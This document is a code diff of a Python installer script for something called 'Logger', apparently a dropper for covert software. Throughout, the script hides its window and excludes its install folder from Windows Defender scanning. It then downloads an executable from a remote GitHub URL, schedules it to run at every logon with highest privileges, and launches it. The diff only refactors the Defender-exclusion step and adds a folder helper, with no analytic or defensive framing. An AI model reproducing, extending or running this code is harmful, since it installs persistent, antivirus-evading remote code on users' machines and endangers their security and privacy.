@@ -8,6 +8,10 @@ url = 'https://github.com/Pixel48/logger/raw/exe/installer.exe'
 folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Logger')
 filepath = os.path.join(folderpath, 'log.exe')
 
+def create_folder(path):
+    if not os.path.exists(path):
+        os.makedirs(path)
+
 def download(url, path):
     with open(path, 'wb') as file:
         response = get(url)
@@ -20,13 +24,13 @@ def hide_window():
 def setup_task():
     run(['schtasks', '/run', '/tn', 'Log', '/tr', f'"{filepath}"', '/sc', 'onlogon', '/rl', 'highest'])
 
-def setup_defender():
-    command = f'Add-MpPreference -ExclusionPath "{folderpath}"'
-    run(['powershell', 'Add-MpPreference', '-ExclusionPath', command], check=True)
+def defender_ignore(folderpath):
+    create_folder(folderpath)
+    run(['powershell', '-command', 'Add-MpPreference', '-ExclusionPath', f'"{folderpath}"' ])
 
 def main():
     hide_window()
-    setup_defender()
+    defender_ignore(folderpath)
     download(url, filepath)
     setup_task()
     os.startfile(filepath)
